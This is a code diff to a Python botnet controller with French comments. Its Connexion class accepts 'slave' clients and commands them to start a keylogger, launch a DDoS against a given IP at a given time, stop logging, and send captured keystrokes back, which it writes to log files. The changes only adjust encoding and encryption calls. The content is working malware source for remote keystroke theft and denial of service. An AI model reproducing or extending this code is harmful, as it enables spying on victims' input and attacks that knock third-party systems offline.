@@ -44,7 +44,7 @@ class Connexion():
         while True:
             print("Attente de connexion")
             conn_reseau, addr = carte_reseau.accept()
-            print(crypto.decrypt(conn_reseau.recv(1024).decode("utf-8")))
+            print(crypto.decrypt(conn_reseau.recv(1024)))
             liste_ip.append(addr[0])
             clients.append(conn_reseau)
             i = 0
@@ -96,7 +96,7 @@ class Connexion():
                 print("Fin du programme")
                 fichier.close()
                 carte_reseau.close()
-                add.send(crypto.encrypt("FIN".encode("utf-8")))
+                add.send(crypto.encrypt(b"FIN"))
                 pass
         except ConnectionResetError:
             print("un slave s'est déconnecté")
@@ -106,7 +106,7 @@ class Connexion():
         # envoie "keylogger" au client
         try:
             for add in self.clients:
-                add.send(crypto.encrypt("keylogger".encode("utf-8")))
+                add.send(crypto.encrypt(b"keylogger"))
         except ConnectionResetError:
             print("un slave c'est déconnecté")
 
@@ -117,13 +117,13 @@ class Connexion():
         # envoie "ddos" au client
         try:
             for add in self.clients:
-                add.send(crypto.encrypt("ddos".encode("utf-8")))
+                add.send(crypto.encrypt(b"ddos"))
                 # envoie ce qui est contenu dans la variable date
-                add.send(crypto.encrypt(date.encode("utf-8")))
+                add.send(date.encode("utf-8"))
                 # pause de 20 milli seconde
                 time.sleep(0.2)
                 # et on envoie enfin la variable ip(entré dans l'argparse)
-                add.send(crypto.encrypt(ip.encode("utf-8")))
+                add.send(ip.encode("utf-8"))
         except ConnectionResetError:
             print("un slave c'est déconnecté")
 
@@ -132,8 +132,8 @@ class Connexion():
         # envoie "stop" au client
         try:
             for add in self.clients:
-                add.send(crypto.encrypt("stop".encode("utf-8")))
-                message = crypto.decrypt(add.recv(1024).decode("utf-8"))
+                add.send(crypto.encrypt(b"stop"))
+                message = crypto.decrypt(add.recv(1024))
                 if message == "logger arreté":
                     print(message)
                 else:
@@ -149,14 +149,14 @@ class Connexion():
             for add in self.clients:
                 add.send(crypto.encrypt("transfert".encode("utf-8")))
                 # on envoie la variable nbLine
-                add.send(crypto.encrypt(nb_line.encode("utf-8")))
+                add.send(nb_line.encode("utf-8"))
                 # on ouvre le fichier chemin(variable entré dans l'argparse) que l'on met dans la variable fichier
                 log_dir = chemin + "get_log" + str(i) + ".txt"
                 print(log_dir)
                 fichier_get_log = open(log_dir, "w")
                 i += 1
                 # on reçoit les infos du keylogger
-                message_recu = crypto.decrypt(add.recv(1024).decode("utf-8"))
+                message_recu = (add.recv(1024).decode("utf-8"))
                 # on écris ces infos dans la variable fichier
                 fichier_get_log.write(message_recu)
                 fichier_get_log.close()
